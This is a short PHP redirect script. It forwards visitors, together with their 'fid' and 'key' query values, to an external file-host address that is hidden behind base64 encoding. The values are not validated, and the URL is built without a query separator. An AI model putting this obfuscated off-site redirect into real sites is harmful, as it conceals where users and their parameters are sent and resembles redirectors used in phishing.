<?php

if (!empty($_GET['key'])) {
if (!empty($_GET['fid'])) {


$fid = $_GET['fid'];
$key = $_GET['key'];
  $url = base64_decode('aHR0cHM6Ly9maWxlaG9zdHBocC5oZXJva3VhcHAuY29tLw==');
header('Location: '.$url.'fid='.$fid.'&key='.$key.'');
} else {
header('Location: /');
}
} else {
header('Location: /');
}


?>
